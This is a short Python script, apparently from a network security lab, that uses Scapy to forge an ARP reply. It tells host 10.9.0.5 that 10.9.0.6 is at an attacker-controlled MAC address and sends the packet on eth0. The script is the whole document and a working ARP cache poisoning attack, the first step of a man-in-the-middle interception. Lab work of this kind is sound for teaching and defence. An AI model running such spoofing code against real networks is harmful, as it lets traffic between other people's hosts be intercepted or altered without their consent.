#!/usr/bin/env python3
from scapy.all import *

IP_B  = "10.9.0.6"
MAC_M = "02:42:0a:09:00:69"
IP_A  = "10.9.0.5"
MAC_A = "02:42:0a:09:00:05"

# ARP reply: op=2
arp = ARP(op=2, psrc=IP_B, hwsrc=MAC_M, pdst=IP_A, hwdst=MAC_A)
eth = Ether(dst=MAC_A, src=MAC_M)
pkt = eth/arp

print("Sending ARP reply to %s: %s is at %s" % (IP_A, IP_B, MAC_M))
sendp(pkt, iface="eth0", verbose=True)
